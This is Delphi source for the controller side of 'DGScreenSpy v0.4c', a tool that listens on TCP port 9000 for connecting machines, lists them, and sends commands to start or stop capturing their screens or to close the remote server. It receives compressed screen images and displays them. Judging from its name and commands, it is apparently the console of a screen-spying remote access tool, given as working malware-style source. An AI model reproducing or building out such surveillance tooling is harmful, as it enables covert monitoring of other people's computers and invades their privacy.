{*******************************************}
{      DGScreenSpy - Client                 }
{      Version: 0.4c                        }
{      Author:  BCB-DG                      }
{      EMail:   iamgyg@163.com              }
{      QQ:      112275024                   }
{      Blog:    http://iamgyg.blog.163.com  }
{*******************************************}
unit Main;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, ExtCtrls, ComCtrls, Buttons, Menus,
  IdBaseComponent, IdComponent, IdTCPServer, View, Color, ZLibEx;

type
  TfrmMain = class(TForm)
    idtsA: TIdTCPServer;
    lvA: TListView;
    pnl1: TPanel;
    btnListen: TSpeedButton;
    btnStop: TSpeedButton;
    btnAbout: TSpeedButton;
    pmA: TPopupMenu;
    miStartSpy: TMenuItem;
    N1: TMenuItem;
    miCSvr: TMenuItem;
    miStopSpy: TMenuItem;
    procedure btnAboutClick(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure btnListenClick(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure btnStopClick(Sender: TObject);
    procedure idtsAConnect(AThread: TIdPeerThread);
    procedure idtsADisconnect(AThread: TIdPeerThread);
    procedure idtsAExecute(AThread: TIdPeerThread);
    procedure idtsAException(AThread: TIdPeerThread; AException: Exception);
    procedure miStartSpyClick(Sender: TObject);
    procedure miCSvrClick(Sender: TObject);
    procedure lvAContextPopup(Sender: TObject; MousePos: TPoint; var Handled: Boolean);
    procedure miStopSpyClick(Sender: TObject);
  private
    FClosed: Boolean;
    procedure DisClients;
    procedure ClearThread(AThread: TIdPeerThread);
  public
  end;

var
  frmMain: TfrmMain;

implementation
{$R *.dfm}

procedure TfrmMain.FormCreate(Sender: TObject);
begin
  btnListenClick(Sender);
end;

procedure TfrmMain.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  DisClients;
end;

procedure TfrmMain.btnAboutClick(Sender: TObject);
const
  ICO_INFO = MB_OK or MB_ICONINFORMATION or MB_TOPMOST;
  DEM_CAP  = 'DGScreenSpy v0.4c';
  DEF_MSG  = 'DGScreenSpy v0.4c, By BCB-DG' + #13#13
             + 'EMail: iamgyg@163.com    QQ: 112275024' + #13#13
             + 'Blog: http://iamgyg.blog.163.com/';
begin
  MessageBox(Handle, DEF_MSG, DEM_CAP, ICO_INFO);
end;

procedure TfrmMain.btnListenClick(Sender: TObject);
begin
  try
    FClosed := True;
    idtsA.DefaultPort := 9000;
    idtsA.Active      := True;
    btnListen.Enabled := False;
    btnStop.Enabled   := True;
    FClosed := False;
  except on e: Exception do
    MessageBox(Handle, PChar(e.Message), PChar(Caption), MB_OK or MB_ICONERROR or MB_TOPMOST);
  end;
end;

procedure TfrmMain.btnStopClick(Sender: TObject);
begin
  DisClients;
  lvA.Items.Clear;
  btnListen.Enabled := True;
  btnStop.Enabled   := False;
end;

procedure TfrmMain.DisClients;
var
  pList: TList;
  i: Integer;
begin
  FClosed := True;
  try
    if idtsA.Active then
    begin
      pList := idtsA.Threads.LockList;
      try
        for i := 0 to pList.Count - 1 do
        begin
          try
            TIdPeerThread(pList.Items[i]).Connection.Disconnect;
          except
            TIdPeerThread(pList.Items[i]).Stop;
          end;
        end;
      finally
        idtsA.Threads.UnlockList;
      end;
      try
        idtsA.Active := False;
      except
      end;
    end;
  except on e: Exception do
    MessageBox(Handle, PChar(e.Message), PChar(Caption), MB_OK or MB_ICONERROR or MB_TOPMOST);
  end;
end;

procedure TfrmMain.lvAContextPopup(Sender: TObject; MousePos: TPoint; var Handled: Boolean);
begin
  miStartSpy.Enabled := Assigned(lvA.Selected);
  miStopSpy.Enabled := Assigned(lvA.Selected);
  miCSvr.Enabled := Assigned(lvA.Selected);
end;

procedure TfrmMain.miStartSpyClick(Sender: TObject);
var
  pForm: TfrmColor;
  pView: TfrmView;
  pItem: TListItem;
  ACmd:  TCtlCmd;
begin
  try
    pItem := lvA.Selected;
    if Assigned(pItem) then
    begin
      if Assigned(pItem.SubItems.Objects[0]) then
      begin
        try
          ShowWindow(TfrmView(pItem.SubItems.Objects[0]).Handle, SW_SHOW);
          SetForegroundWindow(TfrmView(pItem.SubItems.Objects[0]).Handle);
        except
        end;
      end
      else
      begin
        pForm := TfrmColor.Create(Self);
        if (pForm.ShowModal = mrOk) then
        begin
          case pForm.rg1.ItemIndex of
            0: ACmd.X := 1;
            1: ACmd.X := 2;
            2: ACmd.X := 3;
            3: ACmd.X := 5;
            4: ACmd.X := 6;
            5: ACmd.X := 7;
          else
            ACmd.X := 3;
          end;
          ACmd.Cmd := 1;
          pView := TfrmView.Create(Self);
          pItem.SubItems.Objects[0] := pView;
          pView.Item := pITem;
          pView.Show;
          TIdPeerThread(pItem.Data).Connection.WriteBuffer(ACmd, SizeOf(ACmd));
        end;
        pForm.Free;
      end;
    end;
  except on e: Exception do
    MessageBox(Handle, PChar(e.Message), PChar(Caption), MB_OK or MB_ICONERROR or MB_TOPMOST);
  end;
end;

procedure TfrmMain.miStopSpyClick(Sender: TObject);
var
  pItem: TListItem;
  ACmd:  TCtlCmd;
begin
  try
    pItem := lvA.Selected;
    if Assigned(pItem) then
    begin
      ACmd.Cmd := 3;
      TIdPeerThread(pItem.Data).Connection.WriteBuffer(ACmd, SizeOf(ACmd));
    end;
  except on e: Exception do
    MessageBox(Handle, PChar(e.Message), PChar(Caption), MB_OK or MB_ICONERROR or MB_TOPMOST);
  end;
end;

procedure TfrmMain.miCSvrClick(Sender: TObject);
var
  pItem: TListItem;
  ACmd:  TCtlCmd;
begin
  try
    pItem := lvA.Selected;
    if Assigned(pItem) then
    begin
      ACmd.Cmd := 2;
      TIdPeerThread(pItem.Data).Connection.WriteBuffer(ACmd, SizeOf(ACmd));
    end;
  except on e: Exception do
    MessageBox(Handle, PChar(e.Message), PChar(Caption), MB_OK or MB_ICONERROR or MB_TOPMOST);
  end;
end;

procedure TfrmMain.idtsAConnect(AThread: TIdPeerThread);
var
  pItem: TListItem;
begin
  if FClosed then
  begin
    AThread.Terminate;
    Exit;
  end;
  try
    pItem := lvA.Items.Add;
    pItem.Caption := IntToStr(AThread.Connection.Socket.Binding.Handle);
    pItem.SubItems.Add(AThread.Connection.Socket.Binding.PeerIP);
    pItem.SubItems.Add(IntToStr(AThread.Connection.Socket.Binding.PeerPort));
    pItem.Data   := AThread;
    AThread.Data := pItem;
  except
  end;
end;

procedure TfrmMain.idtsADisconnect(AThread: TIdPeerThread);
begin
  ClearThread(AThread);
end;

procedure TfrmMain.idtsAException(AThread: TIdPeerThread; AException: Exception);
begin
  ClearThread(AThread);
end;

procedure TfrmMain.idtsAExecute(AThread: TIdPeerThread);
var
  pItem: TListItem;
  rs, ss: TMemoryStream;
  pCmd: array[0..SizeOf(TSpyCmd) - 1] of Byte;
  pBuf: array[0..8191] of Byte;
  Read, Size: Integer;
begin
  rs := TMemoryStream.Create;
  ss := TMemoryStream.Create;
  try
    AThread.Connection.ReadBuffer(pCmd[0], SizeOf(TSpyCmd));
    rs.SetSize(PSpyCmd(@pCmd[0])^.Size);
    Read := 0;
    while ((Read < PSpyCmd(@pCmd[0])^.Size) and (AThread.Connection.Connected)) do
    begin
      if (PSpyCmd(@pCmd[0])^.Size - Read) >= SizeOf(pBuf) then
        Size := SizeOf(pBuf)
      else
        Size := (PSpyCmd(@pCmd[0])^.Size - Read);
      AThread.Connection.ReadBuffer(pBuf, Size);
      rs.WriteBuffer(pBuf, Size);
      Inc(Read, Size);
    end;
    if AThread.Connection.Connected then
    begin
      rs.Position := 0;
      ZDecompressStream(rs, ss);
      ss.Position := 0;
      pItem := TListItem(AThread.Data);
      if Assigned(pItem) then
      begin
        try
          if Assigned(pItem.SubItems.Objects[0]) then
            TfrmView(pItem.SubItems.Objects[0]).ReadData(ss, TSpyCmd(pCmd).Cmd)
          else
            Sleep(10);
        except
          pItem.SubItems.Objects[0] := nil;
        end;
      end
      else ClearThread(AThread);
    end;
  except
    ClearThread(AThread);
  end;
  rs.Free;
  ss.Free;
end;

procedure TfrmMain.ClearThread(AThread: TIdPeerThread);
var
  pItem: TListItem;
begin
  try
    pItem := TListItem(AThread.Data);
    if Assigned(pItem) then
    begin
      if Assigned(pItem.SubItems.Objects[0]) then TfrmView(pItem.SubItems.Objects[0]).Close;
      pItem.Delete;
    end;
    AThread.Data := nil;
  except
  end;
end;

end.
